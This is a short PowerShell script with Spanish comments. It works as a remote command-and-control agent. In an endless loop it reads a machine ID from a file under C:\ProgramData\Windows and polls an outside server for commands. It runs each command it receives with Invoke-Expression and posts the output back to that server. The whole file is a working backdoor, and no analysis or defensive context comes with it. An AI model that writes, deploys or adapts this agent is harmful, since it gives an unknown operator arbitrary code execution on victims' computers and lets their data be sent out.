while($true){
    # Leer el contenido del archivo de id de sesion
    $id_pc = Get-Content -Path "C:\ProgramData\Windows\id_pc.txt" -Raw
    $id_pc = if ([string]::IsNullOrEmpty($id_pc)) {""} else {$id_pc.Replace("`n","").Replace("`r","")}

    # Añadimos un nuevo comando enviando nuestro id de sesion
    $body = @{
        "id_pc" = $id_pc
    } | ConvertTo-Json

    $headers = @{
        "Access-Control-Allow-Origin" = "*"
        "Content-Type" = "application/json"
	    "charset" = "UTF-8"
    }

    # Ahora pedimos el ulimo input del comando que acabamos de crear en el servidor, 
    # para posteriormente ejecutarlo en la maquina
    $url = "https://jweciqhgpzrshx6gyj6htacmebknyxldtcmiqvwu-mqd4.onrenderaaaa.com/command/input?id_pc=$($id_pc)"


    $res = Invoke-RestMethod -Uri $url -Method "Get" -Headers $headers

    echo $res

    if ($res -eq "") {
        sleep 5
        continue
    }

    # Ahora ejecutamos el comando
    try {
        $output = iex $res | Out-String
    } catch [System.IO.IOException] {
        $output = $_.Exception.Message | Out-String
    } catch [System.UnauthorizedAccessException] {
        $output = $_.Exception.Message | Out-String
    } catch {
        $output = $_.Exception.Message | Out-String    
    }

    $body = @{
        "id_pc" = $id_pc
        "output" = $output
    } | ConvertTo-Json

    # Y lo enviamos al server
    $res = Invoke-RestMethod -Uri "https://jweciqhgpzrshx6gyj6htacmebknyxldtcmiqvwu-mqd4.onrenderaaaa.com/command/output" -Method "Post" -Headers $headers -Body $body

    sleep 5
}
